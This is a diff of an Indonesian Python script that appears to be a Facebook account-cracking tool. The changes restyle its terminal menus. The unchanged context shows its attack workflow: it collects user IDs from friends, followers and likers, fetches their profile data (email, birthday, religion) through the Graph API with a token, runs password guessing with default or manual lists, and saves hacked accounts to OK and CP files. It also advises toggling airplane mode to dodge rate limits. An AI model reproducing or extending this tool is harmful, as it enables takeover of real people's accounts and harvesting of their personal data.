@@ -235,14 +235,14 @@ def _menu_dev_(_Dapunta_Ganteng_Banget_):
     _dapunta_cici_('%s╠══ %sID Pengguna: %s%s'%(_B_,_O_,_H_,_id_dev_))
     _dapunta_cici_('%s╠══ %sIP Adress  : %s%s'%(_B_,_O_,_H_,_ip_dev_))
     _dapunta_cici_('%s╚══ %sTanggal    : %s%s\n'%(_B_,_O_,_P_,_tanggal_))
-    _dapunta_cici_('%s──────────────────────────────────────────────────────────────────────────'%(_K_))
+    _dapunta_cici_('%s──────────────────────────────────────────────────────────────────────'%(_K_))
     _dapunta_cici_('%s╔══%s[%s1%s] %sCrack ID Dari Teman/Publik'%(_B_,_H_,_P_,_H_,_K_))
     _dapunta_cici_('%s╠══%s[%s2%s] %sCrack ID Dari Pengikut'%(_B_,_H_,_P_,_H_,_K_))
     _dapunta_cici_('%s╠══%s[%s3%s] %sCrack ID Dari Likers'%(_B_,_H_,_P_,_H_,_K_))
     _dapunta_cici_('%s╠══%s[%s4%s] %sCek Hasil Crack'%(_B_,_H_,_P_,_H_,_O_))
     _dapunta_cici_('%s╠══%s[%s5%s] %sUser Agent'%(_B_,_H_,_P_,_H_,_U_))
     _dapunta_cici_('%s╚══%s[%s0%s] %sLog Out'%(_B_,_H_,_P_,_H_,_M_))
-    _dapunta_cici_('%s──────────────────────────────────────────────────────────────────────────'%(_K_))            
+    _dapunta_cici_('%s──────────────────────────────────────────────────────────────────────'%(_K_))            
     _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s»»» %sPilih Cok : '%(_B_,_H_))
     _dapunta_cici_('')
     if _dapunta_menu__cici_dapunta__ in ['',' ']:
@@ -278,9 +278,9 @@ def _publik_dev_(_tok_dev_):
         _req_tar_ = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(_target_dev_,_tok_dev_))
         _jso_tar_ = _js_lo_(_req_tar_.text)
         _name_    = _jso_tar_['name']
-        _dapunta_cici_('%s╔══ %sNama : %s%s'%(_U_,_O_,_H_,_name_))
+        _dapunta_cici_('%s╔══ %sNama : %s%s'%(_B_,_O_,_H_,_name_))
     except:
-        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
+        _dapunta_cici_('%s[!] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_))
         time.sleep(2)
         _menu_dev_(_Dapunta_Sayang_Cici_)
     try:
@@ -294,7 +294,7 @@ def _publik_dev_(_tok_dev_):
                 _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
             except:continue
         _jso_exec_.close()
-        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
+        _dapunta_cici_('%s╚══ %sTotal ID : %s%s'%(_B_,_P_,_H_,len(_id_tampung_)))
     except:
         _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
@@ -483,11 +483,11 @@ class _crack_dev_:
         self._ok_dapunta_ = []
         self._cp_dapunta_ = []
         self._hitung_loop_ = 0
-        _dapunta_cici_('\n%s[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(_U_,_P_,_U_,_P_))
+        _dapunta_cici_('\n%s══⟩⟩⟩ %sCrack Dengan Password Default/Manual [d/m]'%(_B_,_P_))
         while True:
-            _pilih_pass_ = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
+            _pilih_pass_ = _cici_dapunta_( '%s»»» %sPilih COK : '%(_B_,_H_))
             if _pilih_pass_=="":
-                _dapunta_cici_('%s[%s!%s] %sSALAH GOBLOK'%(_M_,_P_,_M_,_P_))
+                _dapunta_cici_('%s[%s!%s] %sSALAH GOBLOK'%(_M_,_P_,_M_,_M_))
                 time.sleep(2)
                 _menu_dev_(self._Dapunta_Sayang_Cici_)
             elif _pilih_pass_ in ['m','M','2','02','002']:
@@ -825,15 +825,15 @@ def _var_ugen_(_Dapunta_Cinta_Cici_):
 
 ### Tampilan Metode
 def start_method():
-    _dapunta_cici_('\n%s[%s1%s] %sMetode Api'%(_U_,_P_,_U_,_P_))
-    _dapunta_cici_('%s[%s2%s] %sMetode Mbasic'%(_U_,_P_,_U_,_P_))
+    _dapunta_cici_('\n%s╔══%s[%s1%s] %sMetode Api'%(_B_,_O_,_U_,_O_,_P_))
+    _dapunta_cici_('%s╚══%s[%s2%s] %sMetode Mbasic'%(_B_,_O_,_U_,_O_,_P_))
 
 ### Tampilan Mulai Crack
 def started():
-    _dapunta_cici_('%s[%s•%s] %sCrack Sedang Berjalan...'%(_U_,_P_,_U_,_P_))
-    _dapunta_cici_('%s[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
-    _dapunta_cici_('%s[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
-    _dapunta_cici_('%s[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(_U_,_P_,_U_,_P_))
+    _dapunta_cici_('%s╔══ %sCrack Sedang Berjalan...'%(_B_,_P_))
+    _dapunta_cici_('%s╠══ %sAkun [OK] Disimpan Ke OK/%s.txt'%(_B_,_H_,tanggal))
+    _dapunta_cici_('%s╠══ %sAkun [CP] Disimpan Ke CP/%s.txt'%(_B_,_M_,tanggal))
+    _dapunta_cici_('%s╚══ %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(_B_,_K_))
 
 ### Start
 if __name__=='__main__':
